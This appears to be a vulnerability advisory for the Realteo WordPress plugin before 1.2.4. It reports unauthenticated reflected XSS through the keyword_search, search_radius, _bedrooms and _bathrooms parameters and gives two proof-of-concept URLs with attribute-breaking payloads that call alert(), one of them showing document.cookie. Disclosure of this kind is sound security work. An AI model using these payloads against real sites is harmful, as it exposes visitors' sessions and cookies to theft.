## WordPress Plugin Vulnerabilities

# Realteo < 1.2.4 - Unauthenticated Reflected Cross-Site Scripting (XSS)

### Description

The plugin, used by the Findeo Theme, did not properly sanitise the keyword\_search, search\_radius. \_bedrooms and \_bathrooms GET parameters before outputting them in its properties page, leading to an unauthenticated reflected Cross-Site Scripting issue.

### Proof of Concept

https://example.com/properties/?keyword\_search=--!%3E%22%20autofocus%20onfocus=alert(`m0ze`);//%22
https://example.com/properties/?keyword\_search=--!%3E%22%20autofocus%20onfocus=alert(document.cookie);//%22&search\_radius=--!%3E%22%20autofocus%20onfocus=alert(document.cookie);//%22
